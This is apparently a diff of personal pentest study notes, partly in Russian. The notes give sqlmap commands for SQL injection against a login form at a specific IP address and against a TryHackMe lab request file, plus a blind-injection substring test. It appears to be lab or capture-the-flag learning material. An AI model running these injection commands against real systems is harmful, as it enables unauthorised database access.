@@ -1,5 +1,5 @@
 sqlmap -u "http://51.250.73.193:5008/" --data="username=admin23&password=aaa" --dbs 
-
+В Burp Copy to file запрос. в sqlmap -r файл с запросом -p параметр затем опции. Пример с TryHackMe sqlmap -r req.txt -p blood_group --dbs.
 substring(database(),2,1)='B'
 
 #set git config values #Авторизация
